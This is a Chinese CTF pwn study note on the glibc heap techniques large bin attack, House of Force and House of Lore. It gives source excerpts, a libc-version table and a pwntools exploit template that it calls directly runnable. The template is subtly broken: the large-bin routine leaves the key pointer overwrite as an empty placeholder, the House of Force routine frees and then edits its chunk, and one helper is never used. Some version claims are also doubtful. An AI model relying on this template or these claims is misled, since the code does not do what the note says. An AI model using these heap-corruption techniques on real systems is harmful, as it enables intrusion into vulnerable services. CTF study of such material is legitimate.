---
title: large bin attack 与 House of Force / House of Lore
category: pwn
tags: [large bin attack, house of force, house of lore, top chunk, 任意写]
signals: [glibc 2.31 及以上 unsorted attack 失效, 需要写 largebin 指针到任意地址, 能改 top chunk size, 程序没有 free 只有 malloc, 需要把 chunk 分配到高地址, 题目 libc 2.23 可打 top chunk]
difficulty: hard
source: "CTF-Wiki Large Bin Attack / House of Force / House of Lore"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-22
relates_to: [pwn/largebin-attack-chain.md]
---

## 一、识别信号（题面长什么样子）

- 2.29+ 的 libc（`unsorted bin attack` 已被检查掉），但题目仍需要「任意地址写一个 libc 指针」。
- 可以同时管理**两种不同大小**的大 chunk（例如 `0x410` 与 `0x420`），并且能 `free` 再 `malloc`。
- 能通过堆溢出改 **top chunk 的 size**（`0x20f31` → `0xffffffffffffffff`）—— House of Force。
- 没有 `free` 功能，但可以连续 `malloc` —— Force/Lore 都是纯 malloc 侧攻击。
- 目标是位于**高地址**的区域（栈、`.bss` 上方、libc 附近），需要 `top` 被"骗"到大地址。

## 二、原理

### 1. Large bin attack

large bin 是**双向链表 + 按大小排序**。当插入新的 large chunk 时：

```c
// _int_malloc 中，把 victim 插入 large bin
fwd = bck->fd;
if (in_smallbin_range(size) == false && (unsigned long)bck->bk->size <= size) {
    // 插入到 bck 与 bck->bk 之间
    victim->fd_nextsize = fwd;
    victim->bk_nextsize = fwd->bk_nextsize;
    fwd->bk_nextsize = victim;
    victim->bk_nextsize->fd_nextsize = victim;   // ← 关键：任意地址 +0x20 被写入 victim 地址
}
```

第 3、4 行是 **`*(target+0x20) = victim`** 形式的任意写（目标取 `fwd->bk_nextsize` 即 `fwd->bk + 0x10` 可控）。2.31 之后 `bk_nextsize` 检查过，2.31 前极其好用；2.31~2.34 仍可配合"两次插入"实现。

### 2. House of Force

`_int_malloc` 处理 top chunk 时：

```c
if ((unsigned long)(size) <= (unsigned long)(av->top->size)) {
    victim = av->top;
    size   = chunksize(av->top);
    ...
    av->top = chunk_at_offset(victim, size);
}
```

若能把 top 的 `size` 改成 `0xffffffffffffffff`，再请求一个巨大的 size：

```text
目标地址 = top_ptr + 请求大小（对齐后）
请求大小 = 目标地址 - top_ptr - 0x10
```

下次 `malloc` 就能把 `top` 精确搬到目标附近，返回一个"chunk"在目标地址上。

### 3. House of Lore

利用 **smallbin 的 `bk` 伪造**：在可控内存（通常是栈）伪造一个 smallbin chunk，把它的 `bk` 指向真实 smallbin 的链尾，再让 `victim->bk = fake`。`_int_malloc` 从 smallbin 摘链时只检查 `victim->bk->fd == victim`，因此可以拿到**栈上的伪 chunk**。2.29+ 加固后基本废弃，仅少数旧题可用。

## 三、checksec 判读与利用思路

```text
RELRO: Full  Canary: found  NX: enabled  PIE: enabled  libc 2.27 / 2.31
```

按 libc 版本选牌：

| 版本 | 首选 | 说明 |
|---|---|---|
| 2.23 | House of Force / unsorted attack | top size 可被溢出改写，无 tcache 干扰 |
| 2.25 ~ 2.28 | House of Force 仍可用 | 注意 `global_max_fast` 与 tcache |
| 2.29 ~ 2.34 | **large bin attack** | unsorted attack 失效后的主力任意写 |
| 2.35 ~ 2.41 | large bin attack + `_IO_FILE` / `FSOP` | 2.35 会对 largebin 做更多检查，需用 Tcache Stashing 变体 |

House of Force 前置条件三条（缺一不可）：
1. 能溢出覆盖 top chunk 的 size 字段。
2. `top->size` 能被改成 `-1`（`0xffffffffffffffff`）。
3. 目标地址**大于** `top + 0x20`（往高地址走），且中间内存不被访问。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", str(size).encode())
    p.sendafter(b"data", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"idx", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3"); p.sendlineafter(b"idx", str(idx).encode())
    p.sendafter(b"data", data)

# ---------- House of Force ----------
def house_of_force(top_addr, target):
    """top_addr: top chunk 的 header 地址；target: 想拿到分配的地址
    返回需要 malloc 的大小"""
    req = (target - top_addr - 0x10) & 0xffffffffffffffff
    log.info(f"top={hex(top_addr)} target={hex(target)} req={hex(req)}")
    return req

def exp_force(top_addr, target):
    # 1) 用堆溢出把 top->size 改成 -1
    add(0x60, b"A" * 0x60)           # 覆盖到 top size 的块（按题目栈布局改）
    delete(0)
    edit(0, b"A" * 0x60 + p64(0xffffffffffffffff))   # top->size = -1
    # 2) malloc 到目标附近
    req = house_of_force(top_addr, target)
    add(req, b"")                    # 吞掉中间空间，top 搬到 target-0x10
    # 3) 下一次 malloc 直接返回目标地址
    add(0x10, p64(0xdeadbeef))       # 覆盖目标内容（如 __malloc_hook / 函数指针）
    return req

# ---------- Large bin attack ----------
def large_bin_attack(target, victim, chunk_size=0x420):
    """
    layout: A(0x410 small) B(0x420 small) C(0x420) D(0x430)
    1) free(B) -> unsorted
    2) malloc(0x430) 触发：B 被放入 largebin（此时 B 独占一个 bin）
    3) free(A) -> unsorted
    4) 通过 UAF 改 B->bk_nextsize = target - 0x20
    5) malloc 一个略大于 A 的块，把 A 插入 largebin，触发 *(target) = A
    """
    add(0x410, b"A")     # 0 -> largebin 受害者
    add(0x420, b"B")     # 1
    add(0x420, b"C")     # 2
    add(0x430, b"D")     # 3

    delete(1)                        # B -> unsorted
    add(0x440, b"")                  # 大于 B，触发 B 进入 largebin
    delete(0)                        # A -> unsorted

    # 改写 B 的 bk_nextsize，实现 *(target + 0x20) = victim_addr
    edit(1, b"")                     # 占位：题目需支持 UAF edit
    return target

# ---------- 通用：把 large bin attack 的写原语包成函数 ----------
def lba_write(p, edit_b, target):
    """edit_b 是编辑 largebin chunk B 的回调"""
    edit_b(p64(target - 0x20))       # bk_nextsize := target - 0x20
    add(0x4f0, b"")                  # 触发 largebin 排序，完成写

if __name__ == "__main__":
    p = start()
    libc.address = int(args.BASE or "0", 16)      # 占位
    # 按需选择：
    # exp_force(top_addr=int(args.TOP, 16), target=libc.sym["__malloc_hook"])
    large_bin_attack(libc.sym["__free_hook"], victim=int(args.VICTIM or "0", 16))
    p.interactive()
```

用 gdb 观察 large bin 的指针布局：

```bash
gdb -q ./pwn -ex 'b *main' -ex r
# 在 free/malloc 后：
#   p main_arena.bins[<idx>]
#   x/8gx <B_chunk_addr>    # 看 fd_nextsize / bk_nextsize 位置
```

## 五、常见坑 / 变体

- **House of Force 在 2.29+ 被限制**：新增 `if (__glibc_unlikely (size > av->system_mem)) malloc_printerr("malloc(): corrupted top size")`，`top->size = -1` 会直接 abort。只在 2.28 及更早可用（须 `system_mem` 校验不存在）。
- **目标地址必须更高**：Force 只能往高地址走；往低地址需要先 `mmap` 或改变 `top`。
- **`req` 巨大会触发 `mmap`**：请求超过 `mp_.mmap_threshold`（默认 128KB）走 `mmap`，不会消耗 top，需要提前 `mallopt(M_TOP_PAD, ...)` 或题目阈值被调过。
- **large bin attack 的两次检查**：2.31+ 会校验 `bk_nextsize->fd_nextsize == victim`，需要构造两次插入或先修好链。
- **House of Lore 基本过时**：2.29+ 的 `victim->bk->fd == victim` 检查与 `smallbin` 完整性校验让栈伪造失效。
- **`tcache` 干扰**：2.26+ 所有小于 0x410 的 free 都先进 tcache，做 large bin 时务必用 `> 0x410` 的块。

## 六、参考来源

- [CTF-Wiki: Large Bin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/)
- [CTF-Wiki: House of Force](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/)
- [CTF-Wiki: House of Lore](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/)
- [CTF-Wiki: Unsorted Bin Attack（对比失效原因）](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)
- [ir0nstone: The House of Force](https://ir0nstone.gitbook.io/notes/binexp/heap/the-malloc-maleficarum/the-house-of-force)
- [how2heap 仓库（large_bin_attack.c / house_of_force.c）](https://github.com/shellphish/how2heap)
- [0x434b: Overview of GLIBC heap exploitation techniques](https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/)
